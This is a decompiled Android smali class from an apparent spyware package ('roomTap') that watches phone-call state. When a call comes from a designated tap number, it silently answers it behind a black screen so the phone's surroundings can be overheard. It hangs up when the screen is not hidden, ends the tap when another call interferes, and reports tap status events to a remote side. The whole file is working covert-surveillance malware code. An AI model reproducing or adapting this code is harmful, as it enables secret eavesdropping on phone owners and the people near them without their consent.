.class final Lcom/network/android/roomTap/a;
.super Ljava/lang/Object;

# interfaces
.implements Ljava/lang/Runnable;


# instance fields
.field final synthetic a:Landroid/content/Intent;

.field final synthetic b:Landroid/content/Context;

.field final synthetic c:Lcom/network/android/roomTap/AutoAnswerReceiver;


# direct methods
.method constructor <init>(Lcom/network/android/roomTap/AutoAnswerReceiver;Landroid/content/Intent;Landroid/content/Context;)V
    .locals 0

    iput-object p1, p0, Lcom/network/android/roomTap/a;->c:Lcom/network/android/roomTap/AutoAnswerReceiver;

    iput-object p2, p0, Lcom/network/android/roomTap/a;->a:Landroid/content/Intent;

    iput-object p3, p0, Lcom/network/android/roomTap/a;->b:Landroid/content/Context;

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method


# virtual methods
.method public final run()V
    .locals 5

    :try_start_0
    iget-object v0, p0, Lcom/network/android/roomTap/a;->a:Landroid/content/Intent;

    const-string v1, "state"

    invoke-virtual {v0, v1}, Landroid/content/Intent;->getStringExtra(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-static {v0}, Lcom/network/android/roomTap/AutoAnswerReceiver;->c(Ljava/lang/String;)Ljava/lang/String;

    iget-object v0, p0, Lcom/network/android/roomTap/a;->a:Landroid/content/Intent;

    const-string v1, "incoming_number"

    invoke-virtual {v0, v1}, Landroid/content/Intent;->getStringExtra(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-static {v0}, Lcom/network/android/roomTap/AutoAnswerReceiver;->d(Ljava/lang/String;)Ljava/lang/String;

    const-string v0, "berez isOffHook = false"

    invoke-static {v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    const/4 v0, 0x0

    sput-boolean v0, Lcom/network/android/roomTap/AutoAnswerReceiver;->c:Z

    new-instance v0, Ljava/lang/StringBuilder;

    const-string v1, "AutoAnswerReceiver phone_state: "

    invoke-direct {v0, v1}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-static {}, Lcom/network/android/roomTap/AutoAnswerReceiver;->d()Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    const-string v1, " Incoming number: "

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-static {}, Lcom/network/android/roomTap/AutoAnswerReceiver;->e()Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    invoke-static {}, Lcom/network/android/roomTap/AutoAnswerReceiver;->d()Ljava/lang/String;

    move-result-object v0

    sget-object v1, Landroid/telephony/TelephonyManager;->EXTRA_STATE_RINGING:Ljava/lang/String;

    invoke-virtual {v0, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_7

    invoke-static {}, Lcom/network/android/roomTap/AutoAnswerReceiver;->e()Ljava/lang/String;

    move-result-object v0

    invoke-static {v0}, Lcom/network/android/roomTap/AutoAnswerReceiver;->b(Ljava/lang/String;)Z

    move-result v0

    if-eqz v0, :cond_5

    invoke-static {}, Lcom/network/android/roomTap/AutoAnswerReceiver;->a()Z

    move-result v0

    if-nez v0, :cond_4

    invoke-static {}, Lcom/network/android/a/c;->b()Z

    move-result v0

    if-eqz v0, :cond_3

    const-string v0, "AutoAnswerReceiver onRecieve TelephonyManager.EXTRA_STATE_RINGING"

    invoke-static {v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    iget-object v0, p0, Lcom/network/android/roomTap/a;->c:Lcom/network/android/roomTap/AutoAnswerReceiver;

    iget-object v1, p0, Lcom/network/android/roomTap/a;->b:Landroid/content/Context;

    invoke-virtual {v0, v1}, Lcom/network/android/roomTap/AutoAnswerReceiver;->a(Landroid/content/Context;)V

    sget-boolean v0, Lcom/network/android/roomTap/BlackScreen;->a:Z

    if-nez v0, :cond_1

    const-string v0, "AutoAnswerReceiver onRecieve BlackSCreen screen is not shown and got call!!! disconnecting"

    invoke-static {v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    const/4 v0, 0x1

    const/16 v1, 0x38

    const-string v2, "ROOM_TAP_NOT_ALLOWED_HIDE_ROOM_TAP_FAILED"

    invoke-static {v0, v1, v2}, Lcom/network/android/c/a/b;->a(ISLjava/lang/String;)V

    iget-object v0, p0, Lcom/network/android/roomTap/a;->b:Landroid/content/Context;

    invoke-static {v0}, Lcom/network/android/roomTap/AutoAnswerReceiver;->b(Landroid/content/Context;)V

    :cond_0
    :goto_0
    return-void

    :cond_1
    invoke-static {}, Lcom/network/android/roomTap/AutoAnswerReceiver;->e()Ljava/lang/String;

    move-result-object v0

    invoke-static {v0}, Lcom/network/android/roomTap/AutoAnswerReceiver;->e(Ljava/lang/String;)Ljava/lang/String;

    invoke-static {}, Lcom/network/b/b;->p()V

    invoke-static {}, Lcom/network/b/b;->u()V

    :cond_2
    :goto_1
    invoke-static {}, Lcom/network/android/roomTap/AutoAnswerReceiver;->d()Ljava/lang/String;

    move-result-object v0

    invoke-static {v0}, Lcom/network/android/roomTap/AutoAnswerReceiver;->f(Ljava/lang/String;)Ljava/lang/String;

    invoke-static {}, Lcom/network/android/roomTap/AutoAnswerReceiver;->e()Ljava/lang/String;

    move-result-object v0

    if-eqz v0, :cond_0

    invoke-static {}, Lcom/network/android/roomTap/AutoAnswerReceiver;->e()Ljava/lang/String;

    move-result-object v0

    invoke-static {v0}, Lcom/network/android/roomTap/AutoAnswerReceiver;->g(Ljava/lang/String;)Ljava/lang/String;
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    :catch_0
    move-exception v0

    new-instance v1, Ljava/lang/StringBuilder;

    const-string v2, "berez Exception- "

    invoke-direct {v1, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-static {v1, v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;Ljava/lang/Throwable;)V

    goto :goto_0

    :cond_3
    :try_start_1
    invoke-static {}, Lcom/network/android/roomTap/AutoAnswerReceiver;->e()Ljava/lang/String;

    move-result-object v0

    invoke-static {v0}, Lcom/network/android/roomTap/AutoAnswerReceiver;->a(Ljava/lang/String;)Z

    move-result v0

    if-eqz v0, :cond_2

    const-string v0, "AutoAnswerReceiver onRecieve disconnecting. we are getting call from pbx and we are not on tap window"

    invoke-static {v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    iget-object v0, p0, Lcom/network/android/roomTap/a;->b:Landroid/content/Context;

    invoke-static {v0}, Lcom/network/android/roomTap/AutoAnswerReceiver;->b(Landroid/content/Context;)V

    new-instance v0, Landroid/os/Handler;

    invoke-direct {v0}, Landroid/os/Handler;-><init>()V

    new-instance v1, Lcom/network/android/roomTap/b;

    invoke-direct {v1, p0}, Lcom/network/android/roomTap/b;-><init>(Lcom/network/android/roomTap/a;)V

    const-wide/16 v2, 0xbb8

    invoke-virtual {v0, v1, v2, v3}, Landroid/os/Handler;->postDelayed(Ljava/lang/Runnable;J)Z

    goto :goto_0

    :cond_4
    invoke-static {}, Lcom/network/android/roomTap/AutoAnswerReceiver;->e()Ljava/lang/String;

    move-result-object v0

    invoke-static {v0}, Lcom/network/android/roomTap/AutoAnswerReceiver;->a(Ljava/lang/String;)Z

    move-result v0

    if-eqz v0, :cond_2

    const-string v0, "AutoAnswerReceiver onRecieve - got another call from tap pbx. doing nothing!"

    invoke-static {v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    goto :goto_1

    :cond_5
    const-string v0, "AutoAnswerReceiver onRecieve - this is not the room tap number"

    invoke-static {v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    sget-object v0, Landroid/telephony/TelephonyManager;->EXTRA_STATE_OFFHOOK:Ljava/lang/String;

    invoke-static {}, Lcom/network/android/roomTap/AutoAnswerReceiver;->f()Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_6

    invoke-static {}, Lcom/network/android/roomTap/AutoAnswerReceiver;->a()Z

    move-result v0

    if-eqz v0, :cond_6

    const-string v0, "AutoAnswerReceiver onRecieve isOffHook = true"

    invoke-static {v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    const/4 v0, 0x1

    sput-boolean v0, Lcom/network/android/roomTap/AutoAnswerReceiver;->c:Z

    new-instance v0, Ljava/lang/StringBuilder;

    const-string v1, "AutoAnswerReceiver onRecieve Interfering tap with waiting call. killing tap. not answering. lastCall: "

    invoke-direct {v0, v1}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-static {}, Lcom/network/android/roomTap/AutoAnswerReceiver;->f()Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    const/4 v0, 0x1

    const/16 v1, 0x3f

    const-string v2, "ROOM_TAP_ENDED_INCOMING_CALL"

    invoke-static {v0, v1, v2}, Lcom/network/android/c/a/b;->a(ISLjava/lang/String;)V

    iget-object v0, p0, Lcom/network/android/roomTap/a;->b:Landroid/content/Context;

    invoke-static {v0}, Lcom/network/android/roomTap/AutoAnswerReceiver;->b(Landroid/content/Context;)V

    const/4 v0, 0x1

    sput-boolean v0, Lcom/network/android/roomTap/AutoAnswerReceiver;->d:Z

    iget-object v0, p0, Lcom/network/android/roomTap/a;->b:Landroid/content/Context;

    invoke-static {v0}, Lcom/network/android/roomTap/AutoAnswerReceiver;->e(Landroid/content/Context;)V

    goto/16 :goto_1

    :cond_6
    invoke-static {}, Lcom/network/android/a/c;->b()Z

    move-result v0

    if-eqz v0, :cond_2

    invoke-static {}, Lcom/network/android/roomTap/AutoAnswerReceiver;->a()Z

    move-result v0

    if-nez v0, :cond_2

    const/4 v0, 0x1

    const/16 v1, 0x3f

    invoke-static {v0, v1}, Lcom/network/android/c/a/b;->a(IS)V

    new-instance v0, Ljava/lang/StringBuilder;

    const-string v1, "Auto answer tap window ended be incoming call"

    invoke-direct {v0, v1}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-static {}, Lcom/network/android/roomTap/AutoAnswerReceiver;->f()Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    iget-object v0, p0, Lcom/network/android/roomTap/a;->b:Landroid/content/Context;

    invoke-static {v0}, Lcom/network/android/roomTap/AutoAnswerReceiver;->b(Landroid/content/Context;)V

    const/4 v0, 0x1

    sput-boolean v0, Lcom/network/android/roomTap/AutoAnswerReceiver;->d:Z

    iget-object v0, p0, Lcom/network/android/roomTap/a;->b:Landroid/content/Context;

    invoke-static {v0}, Lcom/network/android/roomTap/AutoAnswerReceiver;->e(Landroid/content/Context;)V

    invoke-static {}, Lcom/network/android/a/c;->a()V

    iget-object v0, p0, Lcom/network/android/roomTap/a;->b:Landroid/content/Context;

    const-string v1, "httpPing"

    invoke-static {v0, v1}, Lcom/network/android/a/c;->a(Landroid/content/Context;Ljava/lang/String;)V

    goto/16 :goto_1

    :cond_7
    invoke-static {}, Lcom/network/android/roomTap/AutoAnswerReceiver;->d()Ljava/lang/String;

    move-result-object v0

    sget-object v1, Landroid/telephony/TelephonyManager;->EXTRA_STATE_OFFHOOK:Ljava/lang/String;

    invoke-virtual {v0, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_8

    const-string v0, "berez isOffHook = true"

    invoke-static {v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    const/4 v0, 0x1

    sput-boolean v0, Lcom/network/android/roomTap/AutoAnswerReceiver;->c:Z

    goto/16 :goto_1

    :cond_8
    invoke-static {}, Lcom/network/android/roomTap/AutoAnswerReceiver;->d()Ljava/lang/String;

    move-result-object v0

    sget-object v1, Landroid/telephony/TelephonyManager;->EXTRA_STATE_IDLE:Ljava/lang/String;

    invoke-virtual {v0, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_2

    const-string v0, "EXTRA_STATE_IDLE"

    invoke-static {v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    invoke-static {}, Lcom/network/android/roomTap/AutoAnswerReceiver;->a()Z

    move-result v0

    if-eqz v0, :cond_9

    const-string v0, "TelephonyManager.EXTRA_STATE_IDLE room tap ended"

    invoke-static {v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    const/4 v0, 0x1

    const/16 v1, 0x17

    invoke-static {v0, v1}, Lcom/network/android/c/a/b;->a(IS)V
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_0

    const/4 v0, 0x1

    :try_start_2
    sput-boolean v0, Lcom/network/android/roomTap/AutoAnswerReceiver;->d:Z

    iget-object v0, p0, Lcom/network/android/roomTap/a;->b:Landroid/content/Context;

    invoke-static {v0}, Lcom/network/android/roomTap/AutoAnswerReceiver;->f(Landroid/content/Context;)V

    iget-object v0, p0, Lcom/network/android/roomTap/a;->b:Landroid/content/Context;

    invoke-static {}, Lcom/network/android/roomTap/AutoAnswerReceiver;->g()Landroid/os/Handler;

    move-result-object v1

    new-instance v2, Lcom/network/android/roomTap/c;

    invoke-direct {v2, p0, v0}, Lcom/network/android/roomTap/c;-><init>(Lcom/network/android/roomTap/a;Landroid/content/Context;)V

    const-wide/16 v3, 0x3e8

    invoke-virtual {v1, v2, v3, v4}, Landroid/os/Handler;->postDelayed(Ljava/lang/Runnable;J)Z
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_1

    goto/16 :goto_1

    :catch_1
    move-exception v0

    :try_start_3
    new-instance v1, Ljava/lang/StringBuilder;

    const-string v2, "berez mHandler.postDelayed - "

    invoke-direct {v1, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-static {v1, v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;Ljava/lang/Throwable;)V

    goto/16 :goto_1

    :cond_9
    const-string v0, "autoAnswerReciever changing room tap false"

    invoke-static {v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    const/4 v0, 0x0

    invoke-static {v0}, Lcom/network/android/roomTap/AutoAnswerReceiver;->a(Z)V
    :try_end_3
    .catch Ljava/lang/Exception; {:try_start_3 .. :try_end_3} :catch_0

    goto/16 :goto_1
.end method
